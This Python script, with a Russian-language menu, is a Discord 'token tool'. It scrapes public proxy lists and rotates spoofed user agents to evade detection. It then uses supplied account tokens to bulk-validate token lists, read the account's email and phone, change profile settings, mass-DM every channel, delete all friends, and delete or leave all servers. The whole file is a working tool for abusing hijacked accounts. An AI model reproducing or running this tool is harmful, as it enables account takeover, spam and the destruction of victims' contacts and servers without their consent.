import os
try:
    import requests
    import colorama
except:
    os.system("pip install requests")
    os.system("pip install colorama")
import random
import re
import threading
import time


from colorama import *
init()
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
reset = Fore.RESET
lightred = Fore.LIGHTRED_EX
lightgreen = Fore.LIGHTGREEN_EX
def checktoken(token):
    response = requests.post(f'https://discord.com/api/v6/invite/{random.randint(1,9999999)}',proxies=proxy(),  headers=getheaders(token))
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

def proxy_scrape():
    print(blue + "Сбор прокси...")
    proxieslog = []
    startTime = time.time()
    temp = os.getenv("temp")+"\\tokentool_proxies"

    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    proxysources = [
        ["http://spys.me/proxy.txt","%ip%:%port% "],
        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
    ]
 
    threads = [] 
    for url in proxysources:
        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    proxies = list(set(proxieslog))
    with open(temp, "w") as f:
        for proxy in proxies:
            for i in range(random.randint(7, 10)):
                f.write(f"{proxy}\n")
    print(blue + "Прокси собраны")
    time.sleep(1.2)
    os.system("cls")

proxy_scrape()

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]
def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

def proxy():
    temp = os.getenv("temp") + "\\tokentool_proxies"
    
    if not os.path.isfile(temp) or os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[0]

    with open(temp, 'r+') as fp:
        lines = fp.readlines()
        fp.seek(0)
        fp.truncate()
        fp.writelines(lines[1:])
    return ({'http://': f'http://{proxy}', 'https://': f'https://{proxy}'})
    
def send_message(token, msg: str, channel_id: str):
        url = f"https://discord.com/api/channels/{channel_id}/messages"
        data = {"content": msg}
        r = requests.post(url,proxies=proxy(), headers=getheaders(token), json=data)
        if r.status_code == 200:
            print(lightgreen + f"Сообщение отправлено в чат с айди {channel_id}" + lightred)
        else:
            print(lightred + f"Ошибка {r.status_code}: {channel_id}")    

def get_guilds(token):
        url = "https://discord.com/api/users/@me/guilds"
        r = requests.get(url, proxies=proxy(), headers=getheaders(token))
        return r.json() if r.status_code == 200 else []

def get_user_channels(token):
        url = f"https://discordapp.com/api/users/@me/channels"
        r = requests.get(url, proxies=proxy(), headers=getheaders(token))
        return r.json() if r.status_code == 200 else []

def checktokenvalid():
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightgreen)
    
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    if status:
        print(lightgreen + "Токен рабочий", lightred)
    else:
        print(lightred + "Токен не рабочий", lightred)
def get_friends(token):
        url = "https://discord.com/api/users/@me/relationships"
        r = requests.get(url, proxies=proxy(), headers=getheaders(token))
        return r.json() if r.status_code == 200 else []

def send_mass_messages():
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightgreen)
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    if status:
        while True:
            msg = input(lightgreen + "Текст: ")
            if msg.split():
                break
            else:
                print(lightred + "Поле не может быть пустым", lightgreen)
        total = 0
        for channel in get_user_channels(token):
            send_message(token, msg, channel['id'])
            total += 1
            time.sleep(1)
        print(f"Отправлено {total} сообщений")
    else:
        print(lightred + "Токен не рабочий")

def changebio():
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightgreen)
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    if status:
        while True:
            bio = input(yellow + "Введите новое BIO: " + reset)
            if bio.split():
                break
            else:
                print(lightred + "Поле не может быть пустым", yellow)
        r = requests.patch(url="https://discord.com/api/v9/users/@me", proxies=proxy(), headers=getheaders(token), json={"bio": bio})
        if r.status_code in [200, 201, 204]:
            print(blue + "Новое BIO: " + reset + bio, lightred)
        else:
            print(lightred + "Произошла ошибка при установке нового BIO. Попробуйте позже")
    else:
        print(lightred + "Токен не рабочий", lightred)

def delete_friends():
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightgreen)
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    if status:
        total = 0
        for friend in get_friends(token):
            url = f"https://discord.com/api/users/@me/relationships/{friend['id']}"
            r = requests.delete(url,proxies=proxy(), headers=getheaders(token))
            if r.status_code in [200, 201, 204]:
                total += 1
        print(lightgreen+ f"Удалено {total} друзей", lightred)
    else:
        print(lightred + "Токен не рабочий")

def delete_guilds(exceptions: list = []):
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightgreen)
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    if status:
        total = 0
        for guild in get_guilds(token):
            if guild["id"] in exceptions:
                continue
            if guild['owner']:
                url = f"https://discord.com/api/guilds/{guild['id']}/delete"
                r = requests.post(url, proxies=proxy(), headers=getheaders(token), json={})
                if r.status_code in [200, 201, 204]:
                    total += 1
            else:
                url = f"https://discord.com/api/users/@me/guilds/{guild['id']}"
                requests.delete(url, proxies=proxy(), headers=getheaders(token), json={})
        print(lightgreen+ f"Удалено {total} серверов", lightred)
    else:
        print(lightred + "Токен не рабочий")
    

def change_status():
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightgreen)
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    if status:
        while True:
            status2 = input(yellow + "Введите новый статус(online, idle, dnd, invisible): " + reset)
            if status2.split():
                break
            else:
                print(lightred + "Поле не может быть пустым", yellow)
        url = "https://discord.com/api/v9/users/@me/settings"
        statuses = ["online", "idle", "dnd", "invisible"]
        if status2 in statuses:
            payload = {"status": status2}
            r = requests.patch(url, proxies=proxy(), headers=getheaders(token), json=payload)
            if r.status_code in [200, 201, 204]:
                print(lightgreen + f"Установлен новый статус: " +reset+ f"{status2}" + lightred)
            else:
                print(lightred + f"При установке нового статуа произошла ошибка. Попробуйте позже")
        else:
            print(lightred+ "Статус не найден в списке.")
    else:
        print(lightred + "Токен не рабочий")

def changelang():
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightred)
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    languages = ["da", "de", "en-GB", "en-US", "es-EN", "fr", "hr", "it", "lt", "hu",
                     "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs",
                     "el", "bg", "ru", "uk", "hi", "th", "zh-CN", "ja", "zh-TW", "ko"]
    url = "https://discordapp.com/api/v8/users/@me/settings"
    if status:
        while True:
            lang = input(yellow + "Введите новый язык: " + reset)
            if lang.split():
                break
            else:
                print(lightred+ "Поле не может быть пустым")
        if lang in languages:
            r = requests.patch(url, proxies=proxy(), headers=getheaders(token), json={"locale": lang})
            if r.status_code in [200, 201, 204]:
                print(lightgreen + "Язык сменен на: " + reset + f"{lang}", lightred)
            else:
                print(lightred + f"При установке нового языка произошла ошибка. Попробуйте позже")
        else:
            print(lightred + "Язык не найден в списке языков")
    else:
        print(lightred + "Токен не рабочий")
        return
def changestatus():
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightgreen)
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    if status:
        while True:
            status2 = input(yellow + "Введите новый статус: " + reset)
            if status2.split():
                break
            else:
                print(lightred + "Поле не может быть пустым", yellow)
        status3 = {"custom_status": {"text": status2}}
        r = requests.patch(url="https://discord.com/api/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=status3)
        if r.status_code in [200, 201, 204]:
            print(blue + "Новый статус: " + reset + status2, lightred)
        else:
            print(lightred + "Произошла ошибка при установке нового статуса. Попробуйте позже")
    else:
        print(lightred + "Токен не рабочий", lightred)

def userinfo():
    while True:
        token = input(lightgreen + "TOKEN: ")
        if token.split():
            break
        else:
            print(lightred + "Поле не может быть пустым", lightgreen)
    try:
        status = checktoken(token)
    except:
        print(lightred + "Токен не рабочий")
        return
    if status:
        response = requests.get(url="https://discord.com/api/v9/users/@me", proxies=proxy(), headers=getheaders(token))
        data = response.json()
        username = data.get("username")
        email = data.get("email")
        verified = data.get("verified")
        if verified:
            verified = "Да"
        else:
            verified = "Нет"
        try:
            phone = data.get("phone")
        except:
            phone = "Нету"
        lang = data.get("locale")
        nitro = data.get("premium_type")
        if nitro == 0:
            nitro = "Нету"
        else:
            nitro="Есть"
        global_name = data.get("global_name")
        print(blue + f"Username: {username}\nEmail: {email}\nVerified: {verified}\nPhone: {phone}\nLang: {lang}\nNitro: {nitro}\nGlobal Name: {global_name}", lightred)
    else:
        print(lightred + "Токен не рабочий", lightred)

def masschecktokenvalid():
    try:
        checked = []
        with open('tokens.txt', 'r') as tokens:
            for token in tokens.read().split('\n'):
                if len(token) > 15 and token not in checked and checktoken(token) == True:
                    print(lightgreen + f'Токен: {token} Рабочий')
                    checked.append(token)
                else:
                    print(lightred + f'Токен: {token} Не рабочий')
        if len(checked) > 0:
            save = input(yellow + f'{len(checked)} рабочих токенов\nСохранить в файл (y/n)').lower()
            if save == 'y':
                name = random.randint(100000000, 9999999999)
                with open(f'{name}.txt', 'w') as saveFile:
                    saveFile.write('\n'.join(checked))
                print(yellow+ f'Токены сохранены в файл с названием {name}.txt!')
        input(yellow + 'Нажми Enter чтобы выйти...' + lightred)
    except FileNotFoundError:
        input(lightred + 'Не могу открыть файл "tokens.txt"!')

import shutil

def print_centered(text):
    terminal_width = shutil.get_terminal_size((80, 20)).columns
    clean_text = Fore.RED + text
    padding = (terminal_width - len(clean_text)) // 2
    centered_text = ' ' * padding + text
    print(centered_text)

import shutil

def print_centered2(text):
    console_width = shutil.get_terminal_size().columns
    text_lines = text.split('\n')
    
    for line in text_lines:
        padding = (console_width - len(line)) // 2
        centered_line = ' ' * padding + line
        print(centered_line)

text = lightred + """     ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗████████╗ ██████╗  ██████╗ ██╗     
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║   ██║   ██║   ██║██║   ██║██║     
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██║   ██║██║     
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║   ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                               """
text2 = lightred + "Введи команду 'commands' для помощи"

print_centered2(text)
print_centered(text2)
while True:
    try:
        a = input("root@127.0.0.1 ~$ " + reset)
        if a.split() is False or a.split() is None:
            pass
        elif a.lower() == "commands":
            print(blue + "1. Изменить BIO\n2. Проверить токен\n3. Mass-Проверка токенов\n4. Информация о пользователе\n5. Изменить пользовательский статус\n6. Поставить новый статус(online, idle, dnd, invisible)\n7. Сменить язык аккаунта\n8. Mass-DM\n9. Удалить всех друзей\n10. Удалить все сервера(надо права создателя).", lightred)
        elif a.lower() == "1":
            changebio()
        elif a.lower() == "2":
            checktokenvalid()
        elif a.lower() == "3":
            masschecktokenvalid()
        elif a.lower() == "4":
            userinfo()
        elif a.lower() == "5":
            changestatus()
        elif a.lower() == "6":
            change_status()
        elif a.lower() == "7":
            changelang()
        elif a.lower() == "8":
            send_mass_messages()
        elif a.lower() == "9":
            delete_friends()
        elif a.lower() == "10":
            delete_guilds()
        else:
            print(reset + f"bash: {a.split()[0]}: command not found", lightred)
    except KeyboardInterrupt:
        print(green + "\nОтключение...", Fore.RESET)
        os._exit(0)
        